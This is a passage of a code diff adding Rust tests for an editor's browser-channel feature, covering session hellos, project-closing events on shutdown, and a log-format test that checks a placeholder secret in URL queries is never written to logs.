+        vec!["welcome".to_string(), "project_closed".to_string()]
+    );
+    assert!(!is_open("/p/web", cx));
+}
+
+#[gpui::test]
+async fn a_panel_hello_never_waits_for_approval(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let notifications = win.notifications();
+    let panel = open_session(1);
+    panel.handle(panel_hello("/p/app"), &win.app_state(), cx);
+    let got = kinds(&panel.drain(cx));
+    assert!(
+        !got.contains(&"approval_pending".to_string()),
+        "A1: {got:?}"
+    );
+    assert_eq!(win.notifications(), notifications, "A1: no approval prompt");
+}
+
+#[gpui::test]
+async fn an_announce_emits_announced_for_its_root(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let seen = announced(cx);
+    let announce = open_session(1);
+    announce.handle(dev_hello("/p/app", 5173), &win.app_state(), cx);
+    cx.run_until_parked();
+    assert_eq!(
+        *seen.borrow(),
+        vec![PathBuf::from("/p/app")],
+        "the event tasks 12 and 13 await"
+    );
+}
+
+#[gpui::test]
+async fn hostile_quitting_zeo_closes_every_root_at_once(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let win = window(&fs, "/p/app", None, cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let app_state = win.app_state();
+    let app_panel = open_session(1);
+    let web_panel = open_session(2);
+    let app_announce = open_session(3);
+    app_panel.handle(panel_hello("/p/app"), &app_state, cx);
+    web_panel.handle(panel_hello("/p/web"), &app_state, cx);
+    app_announce.handle(dev_hello("/p/app", 5173), &app_state, cx);
+    app_panel.drain(cx);
+    web_panel.drain(cx);
+    app_announce.drain(cx);
+
+    cx.update(|cx| cx.shutdown());
+    assert!(
+        has(&app_panel.drain(cx), "project_closed"),
+        "R7.1: /p/app's panel"
+    );
+    assert!(
+        has(&web_panel.drain(cx), "project_closed"),
+        "R7.1: /p/web's panel too"
+    );
+    assert!(
+        has(&app_announce.drain(cx), "project_closed"),
+        "R7.1: the announce session"
+    );
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_projects_logs.rs b/crates/agent_ui/src/browser_channel_tests/devtools_projects_logs.rs
new file mode 100644
index 0000000..fa4104d
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/devtools_projects_logs.rs
@@ -0,0 +1,177 @@
+// Story 055, task 9.1 — the log lines of the connected projects (design.md §B2; R9.1, R9.2 on
+// Zeo's side; Q15). Wired INSIDE `src/browser_channel.rs`, so its path matches the Validation
+// filter `cargo test -p agent_ui devtools_projects`, and it reads the lines back through the
+// channel's own thread-local capture (`logged_lines`): a test binary can install one process-wide
+// logger only, and story 031's suite already owns it.
+//
+// Hostile halves first:
+//   - one line per TRANSITION, not one per session told: a root with an announce and a panel
+//     closing logs one `project_closed`, naming the root;
+//   - R9.2: the announce's URLs carry a query with a secret, and no line carries the query, the
+//     URL, or anything after a `?`;
+//   - a root with a space is still one `key=value` field: quoted, never split.
+
+use std::path::Path;
+
+use gpui::TestAppContext;
+use serde_json::{Value, json};
+
+use super::test_support::*;
+use super::{close_session, logged_lines};
+
+const SECRET_QUERY: &str = "token=secret-query-7c1";
+
+fn dev_hello(root: &str) -> Value {
+    json!({
+        "v": 2,
+        "kind": "hello",
+        "id": "h",
+        "client": {
+            "kind": "dev_server",
+            "root": root,
+            "app_url": format!("http://localhost:5173/page?{SECRET_QUERY}"),
+            "panel_url": format!("http://localhost:5174/?{SECRET_QUERY}")
+        }
+    })
+}
+
+fn panel_hello(root: &str) -> Value {
+    json!({ "v": 2, "kind": "hello", "id": "h", "client": { "kind": "panel", "root": root } })
+}
+
+fn project_lines() -> Vec<String> {
+    logged_lines()
+        .into_iter()
+        .filter(|line| line.starts_with("devtools_projects "))
+        .collect()
+}
+
+fn lines_of(event: &str) -> Vec<String> {
+    let token = format!("event={event} ");
+    project_lines()
+        .into_iter()
+        .filter(|line| line.contains(&token))
+        .collect()
+}
+
+/// The tokens after `event=` must all be `key=value`, a value either bare (no space) or quoted.
+fn assert_key_values(line: &str) {
+    let start = line
+        .find("event=")
+        .unwrap_or_else(|| panic!("a line names its event: {line}"));
+    let mut rest = &line[start..];
+    while !rest.is_empty() {
+        rest = rest.trim_start();
+        if rest.is_empty() {
+            break;
+        }
+        let eq = rest
+            .find('=')
+            .unwrap_or_else(|| panic!("not key=value at {rest:?} in {line}"));
+        let key = &rest[..eq];
+        assert!(
+            !key.is_empty() && key.chars().all(|c| c.is_ascii_lowercase() || c == '_'),
+            "bad key {key:?} in {line}"
+        );
+        let value = &rest[eq + 1..];
+        if let Some(quoted) = value.strip_prefix('"') {
+            let end = quoted
+                .find('"')
+                .unwrap_or_else(|| panic!("unterminated quote in {line}"));
+            rest = &quoted[end + 1..];
+        } else {
+            let end = value.find(' ').unwrap_or(value.len());
+            assert!(end > 0, "empty value for {key} in {line}");
+            rest = &value[end..];
+        }
+    }
+}
+
+#[gpui::test]
+async fn hostile_each_transition_logs_one_key_value_line_with_its_root_and_no_url(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut win = window(&fs, "/p/app", None, cx).await;
+    let app_state = win.app_state();
+    let announce = open_session(1);
+    let panel = open_session(2);
+    announce.handle(dev_hello("/p/app"), &app_state, cx);
+    panel.handle(panel_hello("/p/app"), &app_state, cx);
+    assert_eq!(
+        lines_of("project_announced").len(),
+        1,
+        "R9.1: the announce is logged: {:#?}",
+        project_lines()
+    );
+    assert_eq!(
+        lines_of("panel_opened").len(),
+        1,
+        "R9.1: the panel session opening is logged"
+    );
+
+    win.cx.update(|window, _| window.remove_window());
+    win.cx.run_until_parked();
+    let closed = lines_of("project_closed");
+    assert_eq!(
+        closed.len(),
+        1,
+        "one line per transition, not one per session told: {closed:#?}"
+    );
+    assert!(closed[0].contains(" root=/p/app "), "{}", closed[0]);
+    assert!(closed[0].contains(" sessions=2 "), "{}", closed[0]);
+
+    let _again = window(&fs, "/p/app", None, cx).await;
+    let opened = lines_of("project_open");
+    assert_eq!(opened.len(), 1, "{opened:#?}");
+    assert!(opened[0].contains(" root=/p/app "), "{}", opened[0]);
+
+    cx.update(|cx| close_session(panel.id.clone(), cx));
+    cx.update(|cx| close_session(announce.id.clone(), cx));
+    cx.run_until_parked();
+    assert_eq!(lines_of("panel_closed").len(), 1, "R9.1: the panel close");
+    assert_eq!(lines_of("project_removed").len(), 1, "R2.4 is logged");
+
+    let lines = project_lines();
+    for line in &lines {
+        assert!(
+            line.contains(" root=/p/app "),
+            "every line names its root: {line}"
+        );
+        assert!(
+            !line.contains(SECRET_QUERY),
+            "R9.2: URL query logged: {line}"
+        );
+        assert!(!line.contains('?'), "R9.2: a query logged: {line}");
+        assert!(!line.contains("http"), "R9.2: a URL logged: {line}");
+        assert_key_values(line);
+    }
+}
+
+#[gpui::test]
